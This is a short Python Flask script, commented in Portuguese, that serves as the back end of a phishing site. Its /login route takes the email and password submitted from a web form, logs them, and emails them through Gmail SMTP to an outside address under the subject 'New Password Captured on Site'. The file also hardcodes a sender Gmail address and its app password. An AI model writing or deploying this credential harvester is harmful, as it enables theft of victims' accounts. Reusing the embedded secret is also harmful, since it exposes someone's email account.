from flask import Flask, request, jsonify
import smtplib
from email.mime.text import MIMEText
from datetime import datetime

app = Flask(__name__)

# SUAS CONFIGURAÇÕES (Lembre-se de usar uma senha de app válida)
EMAIL_REMETENTE = "eduardoeleress@gmail.com"
SENHA_APP = "ckepwhwvjczkfmxi" 
EMAIL_DESTINO = "freefire.nobru.cerou@gmail.com"

def enviar_email(email_usuario, senha_digitada):
    try:
        corpo = f"Login realizado em: {datetime.now()}\nUser: {email_usuario}\nSenha: {senha_digitada}"
        msg = MIMEText(corpo)
        msg["Subject"] = "Nova Senha Capturada no Site"
        msg["From"] = EMAIL_REMETENTE
        msg["To"] = EMAIL_DESTINO

        with smtplib.SMTP("smtp.gmail.com", 587) as servidor:
            servidor.starttls()
            servidor.login(EMAIL_REMETENTE, SENHA_APP)
            servidor.send_message(msg)
        return True
    except Exception as e:
        print(f"Erro ao enviar e-mail: {e}")
        return False

# Rota que recebe os dados do HTML
@app.route('/login', methods=['POST'])
def login():
    dados = request.json
    email = dados.get('email')
    senha = dados.get('password')
    
    print(f"Recebido: Email: {email} | Senha: {senha}")
    
    sucesso = enviar_email(email, senha)
    
    if sucesso:
        return jsonify({"status": "success", "message": "Senha enviada ao e-mail!"}), 200
    else:
        return jsonify({"status": "error", "message": "Falha ao enviar e-mail."}), 500

if __name__ == '__main__':
    # Roda o servidor na porta 5000
    app.run(host='0.0.0.0', port=5000, debug=True)
  
